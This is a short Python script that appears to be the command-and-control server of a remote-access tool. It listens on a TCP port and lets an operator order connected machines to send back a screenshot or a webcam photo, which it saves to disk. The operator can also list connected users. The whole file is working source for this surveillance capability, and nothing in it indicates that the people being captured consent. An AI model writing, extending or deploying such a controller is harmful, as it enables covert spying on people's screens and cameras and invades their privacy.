
from socket import *

host = ''
port = 6522
addr = (host,port)

clients = []

tcp_socket = socket(AF_INET, SOCK_STREAM)

tcp_socket.bind(addr)
tcp_socket.listen(90)

while True:
    def screen(conn):
        file = open("screenshot.png", "wb")
        image_chunk = conn.recv(2048)
        while image_chunk:
            file.write(image_chunk)
            image_chunk = conn.recv(2048)
        file.close()
        
    def webcam(conn):
        file = open("webcam.png", "wb")
        image_chunk = conn.recv(2048)
        while image_chunk:
            file.write(image_chunk)
            image_chunk = conn.recv(2048)
        file.close()
        
    conn, addr = tcp_socket.accept()
    data = conn.recv(1024)
    users=[]
    users.append(addr)
    if not data:
        conn.close()
        break
    else:
        command = input("\n\n1 - take screenshot\n2 - take photo on webcam \n3 - Online Users\n-> ")
        conn.send(command.encode())
        print(command.encode())
        if command == "1":
            screen(conn)
        elif command == "2":
            webcam(conn)
        elif command == "3":
            for item in users:
                print(item)
        conn.close()
    
tcp_socket.close()



